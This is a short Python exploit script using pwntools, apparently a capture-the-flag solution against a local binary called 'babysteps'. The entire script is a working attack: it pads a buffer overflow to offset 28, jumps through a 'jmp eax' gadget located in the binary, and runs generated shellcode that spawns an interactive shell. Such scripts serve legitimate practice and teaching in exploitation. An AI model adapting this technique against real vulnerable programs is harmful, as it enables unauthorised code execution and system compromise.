from pwn import *
context.log_level = 'debug'

exe = './babysteps'
elf = context.binary = ELF(exe, checksec=False)

# Start program
io = process(exe)

offset = 28  

#generating shellcode using shellcraft
shellcode=asm(shellcraft.sh()) 

#changing the "jmp eax" to assemble code
jmp_eax=asm("jmp eax")

#finding the offset of jmp eax and put it in the jmp_eax variable
jmp_eax=next(elf.search(jmp_eax))

#setting up the payload 
payload =flat([
    b"A"*offset,        #buffer over flow payload 
    jmp_eax,        #calling the jmp eax 
    shellcode       #storing the shellcode in the jmp_eax and excuting it
])

#sending the payload
io.sendline(payload)

io.interactive()
